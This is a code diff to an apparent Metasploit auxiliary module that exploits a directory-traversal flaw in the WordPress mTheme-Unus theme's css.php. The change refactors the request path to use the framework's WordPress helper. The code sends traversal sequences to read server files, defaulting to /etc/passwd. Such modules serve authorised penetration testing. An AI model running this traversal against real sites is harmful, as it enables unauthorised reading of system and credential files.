@@ -9,6 +9,7 @@ class Metasploit3 < Msf::Auxiliary
 
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
+  include Msf::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
@@ -34,8 +35,6 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        Opt::RPORT(80),
-        OptString.new('TARGETURI', [ true,  "The URI path to the web application", "/wordpress/"]),
         OptString.new('FILEPATH', [true, "The path to the file to read", "/etc/passwd"]),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 6 ])
       ], self.class)
@@ -48,7 +47,7 @@ class Metasploit3 < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(datastore['TARGETURI'], 'wp-content', 'themes', 'mTheme-Unus', 'css', 'css.php'),
+      'uri'    => normalize_uri(wordpress_url_themes, 'mTheme-Unus', 'css', 'css.php'),
       'vars_get' =>
         {
           'files' => "#{traversal}#{filename}"
